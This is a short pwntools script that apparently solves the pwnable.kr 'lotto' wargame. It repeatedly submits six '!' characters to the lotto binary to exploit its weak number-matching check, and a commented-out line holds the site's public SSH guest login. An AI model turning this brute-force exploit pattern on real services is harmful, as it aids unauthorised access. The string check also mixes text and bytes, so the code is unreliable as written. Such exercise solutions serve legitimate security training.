from pwn import *

context.log_level = 'DEBUG'

# sh = ssh('lotto', 'pwnable.kr', password='guest', port=2222)
# p = sh.process('./lotto')
p = process('/home/lotto/lotto')

for i in range(1000):
    p.recv()
    p.sendline(b'1')
    p.recv()
    p.sendline(b'!!!!!!') # ascii值需在1~45的范围内
    p.recvline()
    if 'bad' not in p.recvline():
        break

p.interactive()